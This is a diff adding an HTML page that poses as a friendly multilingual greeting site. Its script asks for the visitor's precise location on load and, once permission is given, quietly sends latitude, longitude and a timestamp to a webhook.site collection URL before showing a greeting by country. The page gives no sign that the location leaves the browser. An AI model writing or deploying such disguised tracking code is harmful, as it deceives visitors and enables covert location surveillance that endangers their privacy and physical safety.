@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Greet You</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #f0f8ff;
+      color: #222;
+    }
+    #message {
+      font-size: 1.4rem;
+      text-align: center;
+      padding: 1.5rem;
+      max-width: 90%;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div id="message">Please allow  — I want to send you a greeting!</div>
+
+  <script>
+    const WEBHOOK_URL = 'https://webhook.site/22fda288-cc42-4926-971d-e70d739cdc68';
+    const messageEl = document.getElementById('message');
+
+    // Localized greetings by country code
+    const greetings = {
+      'IN': 'नमस्ते!',
+      'ES': '¡Hola!',
+      'FR': 'Bonjour !',
+      'DE': 'Hallo!',
+      'JA': 'こんにちは！',
+      'KO': '안녕하세요!',
+      'RU': 'Привет!',
+      'CN': '你好！',
+      'AR': 'مرحبا!',
+      'PT': 'Olá!',
+      'IT': 'Ciao!',
+      'BN': 'নমস্কার!',
+      'TA': 'வணக்கம்!',
+      'TE': 'నమస్కారం!',
+      'MR': 'नमस्कार!',
+      'GU': 'નમસ્તે!',
+      'default': 'Hello!'
+    };
+
+    function getGreeting(countryCode) {
+      return greetings[countryCode] || greetings.default;
+    }
+
+    function sendCoordinates(lat, lon) {
+      const url = `${WEBHOOK_URL}?lat=${encodeURIComponent(lat)}&lng=${encodeURIComponent(lon)}&message=${encodeURIComponent("Person's coordinate on page load")}&timestamp=${encodeURIComponent(new Date().toISOString())}`;
+      fetch(url, { method: 'GET' }).catch(() => {});
+    }
+
+    async function getCountryCode(lat, lon) {
+      try {
+        const res = await fetch(
+          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`
+        );
+        const data = await res.json();
+        return data.countryCode || 'default';
+      } catch {
+        return 'default';
+      }
+    }
+
+    function onLocationSuccess(pos) {
+      const { latitude, longitude } = pos.coords;
+
+      // Send coordinates
+      sendCoordinates(latitude, longitude);
+
+      // Show greeting
+      getCountryCode(latitude, longitude).then(country => {
+        const greeting = getGreeting(country);
+        messageEl.textContent = `${greeting} 🌍`;
+      });
+    }
+
+    function onLocationError() {
+      // Do nothing — keep the original "please allow" message
+      // (This includes denied, timeout, unavailable, etc.)
+    }
+
+    // 🔥 Trigger location request immediately on page load
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        onLocationSuccess,
+        onLocationError,
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 600000 }
+      );
+    }
+    // If geolocation unsupported (very rare), message stays as is
+  </script>
+</body>
+</html>
